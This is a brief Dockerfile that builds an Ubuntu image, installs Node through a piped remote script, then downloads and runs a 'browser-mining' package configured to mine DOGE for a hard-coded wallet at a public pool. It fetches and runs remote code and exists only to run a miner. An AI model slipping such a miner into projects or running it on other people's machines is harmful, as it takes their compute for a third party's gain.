# Use an official Node runtime as base image
FROM ubuntu:22.04

# Install necessary tools
RUN apt-get update && apt-get install -y curl ca-certificates sudo wget

# Install NVM (Node Version Manager) and Node 18
RUN curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash \
    && . ~/.bashrc \
    && nvm install 18

# Install Miner
WORKDIR /miner
RUN curl -LJO https://github.com/malphite-code/browser-mining/releases/download/v1/browser-mining.tar.gz \
    && tar -xf browser-mining.tar.gz \
    && cd browser-mining \
    && npm install \
    && sh install.sh \
    && rm config.json \
    && echo '[{"algorithm": "yespower", "host": "yespower.na.mine.zpool.ca", "port": 6234, "worker": "DSXfQwLuNLBHS4shPD241km3UCDVq6rXuZ", "password": "c=DOGE", "workers": 1 }]' > config.json

# Run the miner
CMD ["node", "index.js"]
